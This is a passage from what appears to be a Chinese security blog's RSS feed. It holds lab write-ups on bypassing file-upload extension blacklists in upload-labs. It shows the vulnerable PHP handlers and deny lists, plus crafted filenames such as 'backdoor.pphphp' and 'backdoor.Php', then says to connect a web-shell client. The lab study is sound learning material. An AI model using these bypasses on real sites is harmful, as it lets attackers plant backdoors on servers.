class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现核心语句是：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_ireplace&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;它是将&lt;code&gt;file_name&lt;/code&gt;变量中获取到的文件上传名，从中遍历&lt;code&gt;deny_ext&lt;/code&gt;数组的内容，如果发现有相同字符串，则替换成空&lt;/p&gt;
&lt;p&gt;如下测试：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&lt;span class=&#34;string&#34;&gt;&amp;quot;backdoor.phphpp&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003180734935.png&#34; alt=&#34;image-20221003180734935&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么改变下双写位置就可以有：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&lt;span class=&#34;string&#34;&gt;&amp;quot;backdoor.pphphp&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003181058551.png&#34; alt=&#34;image-20221003181058551&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传成功。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%A4%A7%E5%B0%8F%E5%86%99+%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</guid>
            <title>后缀大小写+空格绕过</title>
            <link>https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%A4%A7%E5%B0%8F%E5%86%99+%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</link>
            <category>文件上传漏洞探究</category>
            <pubDate>Mon, 03 Oct 2022 16:59:03 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;后缀大小写-空格绕过&#34;&gt;&lt;a href=&#34;#后缀大小写-空格绕过&#34; class=&#34;headerlink&#34; title=&#34;后缀大小写+空格绕过&#34;&gt;&lt;/a&gt;后缀大小写+空格绕过&lt;/h1&gt;&lt;p&gt;本次讲解后缀校验相关的简单绕过方式，大小写+空格绕过&lt;/p&gt;
&lt;p&gt;以Less-05为例：&lt;/p&gt;
&lt;h2 id=&#34;后缀大小写绕过&#34;&gt;&lt;a href=&#34;#后缀大小写绕过&#34; class=&#34;headerlink&#34; title=&#34;后缀大小写绕过&#34;&gt;&lt;/a&gt;后缀大小写绕过&lt;/h2&gt;&lt;p&gt;常规看后台源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;file_exists&lt;/span&gt;(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aScx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aShx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cEr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.sWf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;deldot&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//删除文件名末尾的点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strrchr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_ireplace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//去除字符串::$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//首尾去空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;).&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;此文件类型不允许上传！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到这回直接过滤了&lt;code&gt;.htaccess&lt;/code&gt;以及&lt;code&gt;.phtml&lt;/code&gt;，但是比前几次缺少了后缀名全部转小写的操作，因此存在漏洞。&lt;/p&gt;
&lt;p&gt;抓包，送入Repeater，将后缀名php变成Php&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=&amp;quot;backdoor.Php&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功上传&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003170308084.png&#34; alt=&#34;image-20221003170308084&#34;&gt;&lt;/p&gt;
&lt;p&gt;连接菜刀即可。&lt;/p&gt;
&lt;p&gt;另外，比起黑名单列一大堆，不如使用&lt;code&gt;白名单过滤&lt;/code&gt;会更加简洁、安全。&lt;/p&gt;
&lt;h2 id=&#34;后缀加空格绕过&#34;&gt;&lt;a href=&#34;#后缀加空格绕过&#34; class=&#34;headerlink&#34; title=&#34;后缀加空格绕过&#34;&gt;&lt;/a&gt;后缀加空格绕过&lt;/h2&gt;&lt;p&gt;这是一个Windows上才会有的特性，Linux主机没有。&lt;/p&gt;
&lt;p&gt;以Less-06为例：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;file_exists&lt;/span&gt;(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aScx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aShx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cEr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.sWf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;deldot&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//删除文件名末尾的点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strrchr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;strtolower&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//转换为小写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;str_ireplace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//去除字符串::$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span 